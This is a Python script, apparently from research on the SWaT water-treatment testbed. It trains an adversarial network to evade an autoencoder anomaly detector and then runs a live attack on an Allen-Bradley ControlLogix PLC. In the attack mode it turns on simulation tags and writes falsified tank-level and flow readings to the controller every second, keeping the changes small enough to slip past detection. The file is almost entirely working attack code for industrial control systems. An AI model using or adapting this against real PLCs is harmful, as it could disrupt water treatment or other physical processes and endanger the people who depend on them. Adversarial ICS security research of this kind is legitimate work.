#!/usr/bin/env python3
"""
phase2_spoof.py  —  SWaT Phase 2: Adversarial ML Evasion (Paper #31)
Target: Allen-Bradley ControlLogix PLC1 via pylogix

Inference uses pure numpy — no PyTorch required on the HMI.
Training still uses PyTorch (run on your Mac, produces adv_model.npz).

Usage:
  # Train (on Mac — requires PyTorch):
  python3 phase2_spoof.py train --data assets/19-Feb-2026_0930_1735.csv --model adv_model.npz

  # Attack (on HMI — numpy only):
  python3 phase2_spoof.py attack --plc-ip 192.168.1.10 --duration 120
"""

import argparse, time, signal, sys, os
import numpy as np
import pandas as pd
from datetime import datetime
from pylogix import PLC

EPSILON   = 0.1
FEATURES  = ['HMI_LIT101.Pv', 'AI_FIT_101_FLOW']

SIM_TAGS = {
    'HMI_LIT101.Pv':   ('HMI_LIT101.Sim',  'HMI_LIT101.Sim_PV'),
    'AI_FIT_101_FLOW':  ('HMI_FIT101.Sim',   'HMI_FIT101.Sim_PV'),
}

CSV_TO_TAG = {
    'LIT101.Pv': 'HMI_LIT101.Pv',
    'FIT101.Pv': 'AI_FIT_101_FLOW',
}

stop_flag = False

# Logging
LOG_DIR = os.path.join(os.path.dirname(__file__), '..', '..', 'logs')
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, f"phase2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

def tprint(msg):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG_FILE, 'a') as f: f.write(line + '\n')
    except: pass


# ── Numpy inference (no PyTorch needed) ───────────────────────────────────────

def relu(x):
    return np.maximum(0, x)

def tanh(x):
    return np.tanh(x)

def adv_forward_np(x, weights, epsilon=EPSILON):
    """Pure numpy adversarial encoder: generates delta constrained to [-eps, +eps]."""
    h = tanh(x @ weights['adv_w0'].T + weights['adv_b0'])
    h = tanh(h @ weights['adv_w1'].T + weights['adv_b1'])
    h = tanh(h @ weights['adv_w2'].T + weights['adv_b2'])
    delta = np.clip(h * epsilon, -epsilon, epsilon)
    return delta

def load_np_adv(model_path):
    m = np.load(model_path, allow_pickle=True)
    weights = {
        'adv_w0': m['adv_net.0.weight'], 'adv_b0': m['adv_net.0.bias'],
        'adv_w1': m['adv_net.2.weight'], 'adv_b1': m['adv_net.2.bias'],
        'adv_w2': m['adv_net.4.weight'], 'adv_b2': m['adv_net.4.bias'],
    }
    feat_cols = list(m['feat_cols'])
    return weights, m['mu'], m['sigma'], int(m['window']), feat_cols


# ── Training (requires PyTorch — run on Mac) ──────────────────────────────────

def train(data_path, model_path, epochs=100, window=10):
    try:
        import torch
        import torch.nn as nn
    except ImportError:
        print("[!] PyTorch required for training. Install: pip install torch")
        print("    Run training on your Mac, then copy the .npz to HMI.")
        sys.exit(1)

    class Autoencoder(nn.Module):
        def __init__(self, input_dim, latent_dim=8):
            super().__init__()
            self.encoder = nn.Sequential(
                nn.Linear(input_dim, 32), nn.ReLU(),
                nn.Linear(32, 16),        nn.ReLU(),
                nn.Linear(16, latent_dim))
            self.decoder = nn.Sequential(
                nn.Linear(latent_dim, 16), nn.ReLU(),
                nn.Linear(16, 32),         nn.ReLU(),
                nn.Linear(32, input_dim))
        def forward(self, x):
            return self.decoder(self.encoder(x))

    class AdversarialEncoder(nn.Module):
        def __init__(self, input_dim, epsilon=EPSILON):
            super().__init__()
            self.epsilon = epsilon
            self.net = nn.Sequential(
                nn.Linear(input_dim, 32), nn.Tanh(),
                nn.Linear(32, 32),        nn.Tanh(),
                nn.Linear(32, input_dim), nn.Tanh())
        def forward(self, x):
            return torch.clamp(self.net(x) * self.epsilon, -self.epsilon, self.epsilon)

    print(f"[*] Loading {data_path}...")
    df = pd.read_csv(data_path, low_memory=False)
    rename = {k: v for k, v in CSV_TO_TAG.items() if k in df.columns}
    df = df.rename(columns=rename)
    feat_cols = [f for f in FEATURES if f in df.columns]
    if not feat_cols:
        feat_cols = [k for k in CSV_TO_TAG.keys() if k in df.columns]
    if not feat_cols:
        print(f"[!] Features not found. Available: {list(df.columns[:10])}")
        sys.exit(1)

    for c in feat_cols:
        df[c] = pd.to_numeric(df[c], errors='coerce')
    data = df[feat_cols].dropna().values.astype(np.float32)
    mu, sigma = data.mean(0), data.std(0) + 1e-8
    norm = (data - mu) / sigma

    X = np.stack([norm[i:i+window].flatten() for i in range(len(norm)-window)])
    X_t = torch.tensor(X)
    input_dim = X.shape[1]

    ae  = Autoencoder(input_dim)
    adv = AdversarialEncoder(input_dim)
    opt_ae  = torch.optim.Adam(ae.parameters(),  lr=1e-3)
    opt_adv = torch.optim.Adam(adv.parameters(), lr=1e-3)
    mse = nn.MSELoss()

    print(f"[*] Training  epochs={epochs}  input_dim={input_dim}  features={feat_cols}")
    for ep in range(1, epochs+1):
        ae.train(); adv.eval(); opt_ae.zero_grad()
        loss_ae = mse(ae(X_t), X_t)
        loss_ae.backward(); opt_ae.step()

        ae.eval(); adv.train(); opt_adv.zero_grad()
        delta = adv(X_t)
        loss_adv = mse(ae(X_t + delta), X_t)
        loss_adv.backward(); opt_adv.step()

        if ep % 10 == 0:
            print(f"    Epoch {ep:4d}/{epochs}  AE={loss_ae.item():.6f}  Adv={loss_adv.item():.6f}")

    # Save as numpy .npz
    np_data = {'mu': mu, 'sigma': sigma, 'window': np.array(window),
               'input_dim': np.array(input_dim), 'feat_cols': np.array(feat_cols)}
    for k, v in ae.state_dict().items():
        np_data[f'ae_{k}'] = v.numpy()
    for k, v in adv.state_dict().items():
        np_data[f'adv_{k}'] = v.numpy()
    np.savez(model_path, **np_data)
    print(f"[+] Models saved: {model_path}")


# ── Live Attack (numpy only — runs on HMI) ───────────────────────────────────

def attack(plc_ip, model_path, duration):
    global stop_flag
    print(f"[LOG] Writing to {LOG_FILE}")
    tprint(f"[*] Loading {model_path}...")
    weights, mu, sigma, window, feat_cols = load_np_adv(model_path)

    tprint(f"[*] Adversarial attack -> PLC {plc_ip}  duration={duration}s  epsilon={EPSILON}")
    history = []
    end_time = time.time() + duration
    cycle = 0

    with PLC() as plc:
        plc.IPAddress = plc_ip
        while not stop_flag and time.time() < end_time:
            results = plc.Read(feat_cols)
            if not isinstance(results, list): results = [results]
            raw_vals = np.array([r.Value if r.Value is not None else 0.0
                                 for r in results], dtype=np.float32)
            norm_vals = (raw_vals - mu) / sigma
            history.append(norm_vals)
            if len(history) < window:
                time.sleep(1.0); continue
            history = history[-window:]

            x = np.array(history).flatten().astype(np.float32).reshape(1, -1)
            delta = adv_forward_np(x, weights)

            delta_last   = delta[0, -(len(feat_cols)):]
            perturbed    = norm_vals + delta_last
            perturbed_pv = perturbed * sigma + mu

            for feat, orig, pert in zip(feat_cols, raw_vals, perturbed_pv):
                if feat in SIM_TAGS:
                    sim_en, sim_pv = SIM_TAGS[feat]
                    plc.Write(sim_en, True)
                    plc.Write(sim_pv, float(pert))

            cycle += 1
            if cycle % 5 == 0:
                for f, o, p in zip(feat_cols, raw_vals, perturbed_pv):
                    tprint(f"    [adv {cycle:4d}] {f}: {o:.3f} -> {p:.3f}  (d={p-o:+.4f})")
            time.sleep(1.0)

    # Disable simulation on exit
    with PLC() as plc:
        plc.IPAddress = plc_ip
        for feat in feat_cols:
            if feat in SIM_TAGS:
                plc.Write(SIM_TAGS[feat][0], False)
    tprint(f"[+] Simulation disabled. Phase 2 complete. {cycle} cycles.")


def signal_handler(sig, frame):
    global stop_flag
    print("\n[!] Stopping phase 2...")
    stop_flag = True

def main():
    signal.signal(signal.SIGINT, signal_handler)
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest='mode', required=True)
    tr = sub.add_parser('train')
    tr.add_argument('--data',   required=True)
    tr.add_argument('--model',  default='adv_model.npz')
    tr.add_argument('--epochs', type=int, default=500)
    tr.add_argument('--window', type=int, default=10)
    at = sub.add_parser('attack')
    at.add_argument('--plc-ip',   default='192.168.1.10')
    at.add_argument('--model',    default='adv_model.npz')
    at.add_argument('--duration', type=int, default=120)
    args = ap.parse_args()
    if args.mode == 'train':
        train(args.data, args.model, args.epochs, args.window)
    else:
        attack(args.plc_ip, args.model, args.duration)

if __name__ == '__main__':
    main()
